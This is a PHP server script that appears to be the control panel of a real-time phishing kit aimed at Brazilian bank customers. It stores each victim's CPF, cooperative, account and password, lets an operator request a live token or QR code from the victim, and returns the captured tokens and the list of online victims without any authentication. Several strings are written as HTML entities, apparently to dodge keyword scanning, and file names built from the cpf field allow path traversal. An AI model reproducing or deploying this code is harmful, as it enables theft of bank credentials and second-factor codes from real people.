<?php
header('Content-Type: application/json');

$statusPath = 'status.json';
$clientesPath = 'clientes.json';
$tokensDir = 'tokens/';
$qrcodesDir = 'qrcodes/';

foreach ([$tokensDir, $qrcodesDir] as $dir) {
    if (!is_dir($dir)) mkdir($dir, 0777, true);
}

function lerJSON($arquivo) {
    return file_exists($arquivo) ? json_decode(file_get_contents($arquivo), true) : [];
}

function salvarJSON($arquivo, $dados) {
    file_put_contents($arquivo, json_encode($dados, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $acao = $_POST['acao'] ?? '';

    if ($acao === 'cliente_online') {
        $cpf = $_POST['cpf'] ?? '';
        $coop = $_POST['cooperativa'] ?? '';
        $conta = $_POST['conta'] ?? '';
        $senha = $_POST['senha'] ?? '';

        if ($cpf) {
            $clientes = lerJSON($clientesPath);
            $clientes[$cpf] = [
                'online' => true,
                'cpf' => $cpf,
                'cooperativa' => $coop,
                'conta' => $conta,
                'senha' => $senha
            ];
            salvarJSON($clientesPath, $clientes);
            echo json_encode(['msg' => 'Cl&#x69;ente online']);
        }

    } elseif ($acao === 'cliente_offline') {
        $cpf = $_POST['cpf'] ?? '';
        $clientes = lerJSON($clientesPath);
        if ($cpf && isset($clientes[$cpf])) {
            unset($clientes[$cpf]);
            salvarJSON($clientesPath, $clientes);

            $tokenFile = $tokensDir . "token_$cpf.txt";
            if (file_exists($tokenFile)) unlink($tokenFile);

            $qrCodeFile = $qrcodesDir . "qrcode_$cpf.png";
            if (file_exists($qrCodeFile)) unlink($qrCodeFile);

            $status = lerJSON($statusPath);
            if (isset($status['cpf']) && $status['cpf'] === $cpf) {
                salvarJSON($statusPath, []);
            }

            echo json_encode(['msg' => "Cl&#x69;ente $cpf removido com sucesso."]);
        } else {
            echo json_encode(['erro' => 'Cl&#x69;ente n&#xE3;o encontrado.']);
        }

    } elseif ($acao === 'solicitar') {
        $cpf = $_POST['cpf'] ?? '';
        $tipo = $_POST['tipo'] ?? '';
        if ($cpf && $tipo) {
            salvarJSON($statusPath, ['solicitar' => true, 'tipo' => $tipo, 'cpf' => $cpf]);
            echo "Solicitado $tipo para $cpf";
        }

    } elseif ($acao === 'enviar_token') {
        $token = $_POST['token'] ?? '';
        $cpf = $_POST['cpf'] ?? '';
        if ($cpf && $token) {
            $file = $tokensDir . "token_$cpf.txt";
            file_put_contents($file, date('d/m/Y H:i:s') . " - To&#x6B;en: $token\n", FILE_APPEND);
            salvarJSON($statusPath, []);
            $qr = $qrcodesDir . "qrcode_$cpf.png";
            if (file_exists($qr)) unlink($qr);
            echo "To&#x6B;en salvo com sucesso";
        }

    } elseif ($acao === 'enviar_qrcode') {
        $cpf = $_POST['cpf'] ?? '';
        if (!empty($_FILES['qr_code']) && $cpf) {
            $dest = $qrcodesDir . "qrcode_$cpf.png";
            move_uploaded_file($_FILES['qr_code']['tmp_name'], $dest);
            echo "QR enviado";
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $acao = $_GET['acao'] ?? '';

    if ($acao === 'listar_clientes') {
        $clientes = lerJSON($clientesPath);
        $ativos = array_filter($clientes, fn($c) => isset($c['online']) && $c['online']);
        echo json_encode(array_values($ativos));

    } elseif ($acao === 'verificar') {
        $cpf = $_GET['cpf'] ?? '';
        $status = lerJSON($statusPath);
        if (isset($status['cpf']) && $status['cpf'] === $cpf) {
            echo json_encode($status);
        } else {
            echo json_encode(['solicitar' => false]);
        }

    } elseif ($acao === 'verificar_qrcode') {
        $cpf = $_GET['cpf'] ?? '';
        $file = $qrcodesDir . "qrcode_$cpf.png";
        echo json_encode(['qr_url' => file_exists($file) ? $file : '']);

    } elseif ($acao === 'obter_tokens') {
        $cpf = $_GET['cpf'] ?? '';
        $file = $tokensDir . "token_$cpf.txt";
        echo file_exists($file) ? file_get_contents($file) : '';
    }
}
